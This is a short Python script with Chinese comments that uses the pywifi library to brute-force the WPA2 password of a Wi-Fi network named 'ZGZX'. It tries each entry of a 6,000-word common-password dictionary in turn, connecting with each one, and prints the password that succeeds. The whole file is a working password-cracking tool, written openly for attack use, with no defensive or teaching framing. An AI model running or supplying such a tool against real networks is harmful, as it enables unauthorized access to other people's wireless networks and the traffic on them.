#!/usr/bin/env python
# -*- coding: utf-8 -*-

import pywifi
from pywifi import const
import time


def WifiNet(passwd):
    wifi = pywifi.PyWiFi()
    # 抓取第一个wifi网卡
    iface = wifi.interfaces()[0]
    # 尝试断开网卡
    iface.disconnect()
    # 断开需要时间,先设定一秒
    time.sleep(1)
    # 查看是否断开网卡
    if iface.status() == const.IFACE_DISCONNECTED:
        # 创建wifi链接文件
        profile = pywifi.Profile()
        # 网卡的名称
        profile.ssid = 'ZGZX'
        # 网卡的开放
        profile.auth = const.AUTH_ALG_OPEN
        # 设置加密类型
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        # 加密单元
        profile.cipher = const.CIPHER_TYPE_CCMP
        # wifi密码
        profile.key = passwd
        # 删除所有的wifi文件
        iface.remove_all_network_profiles()
        # 设定新的链接文件
        profile_new = iface.add_network_profile(profile)
        # 链接wifi
        iface.connect(profile_new)
        # 测试链接需要时间 所有要睡眠
        time.sleep(3)
        # 判断链接状态 默认为4 const.IFACE_CONNECTED=4
        if iface.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False
    else:
        print('已连接')


def WifiPasswd():
    wifipwd = open('6000常用密码字典.txt', 'r')
    # 开始破解wifi
    while True:
        filepwd = wifipwd.readline()
        filewd = WifiNet(filepwd)
        try:
            if filewd:
                print('密码正确:', filepwd)
                # 结束循环
                break
            else:
                print('密码不正确:', filepwd)
        except:
            # 出现错误就跳出本次循环
            continue


WifiPasswd()
